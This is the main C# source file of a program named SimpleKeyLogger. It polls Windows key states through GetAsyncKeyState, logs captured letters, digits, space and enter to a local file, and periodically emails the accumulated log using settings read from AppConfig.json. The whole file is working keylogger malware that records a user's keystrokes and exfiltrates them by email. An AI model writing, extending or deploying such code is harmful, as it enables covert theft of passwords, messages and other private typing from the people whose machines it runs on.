using Newtonsoft.Json;
using SimpleKeyLogger.EmailSender;
using SimpleKeyLogger.FileAdapters;
using SimpleKeyLogger.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace SimpleKeyLogger
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [STAThread]
        static void Main()
        {
            bool endOfProgram = false;
            long numberOfKey = 0;
            string configText = File.ReadAllText("AppConfig.json");

            AppConfig config = JsonConvert.DeserializeObject<AppConfig>(configText);
            LoggerEmailSender sender = new LoggerEmailSender(config);
            TextFileAdapter file = new TextFileAdapter("log", "");
            
            List<int> charSet = new List<int>();
            for (int i = 48; i <= 57; i++) charSet.Add(i);
            for (int i = 65; i <= 90; i++) charSet.Add(i);
            for (int i = 96; i <= 105; i++) charSet.Add(i);
            charSet.Add(32);
            charSet.Add(13);
            charSet.Add(27);

            while (true)
            {
                Thread.Sleep(10);

                foreach (int i in charSet)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == 32769)
                    {
                        if (i >= 96 && i <= 105)
                        {
                            file.WriteToFile((char)(i - 48));
                        }
                        else if (i == 27)
                        {
                            endOfProgram = true;
                        }
                        else
                        {
                            file.WriteToFile((char)i);
                        }

                        numberOfKey++;
                        break;
                    }
                }
                if (endOfProgram) 
                    break;

                if (numberOfKey % config.Limit == 0 && numberOfKey > 0)
                {
                    try
                    {
                       var task = sender.SendAsync("SimpleKeyLogger - TextLog", file.ReadTextFile());
                    }
                    catch (Exception e)
                    { 
                        Console.WriteLine(e.Message);
                    }
                }
            }
        }
    }
}
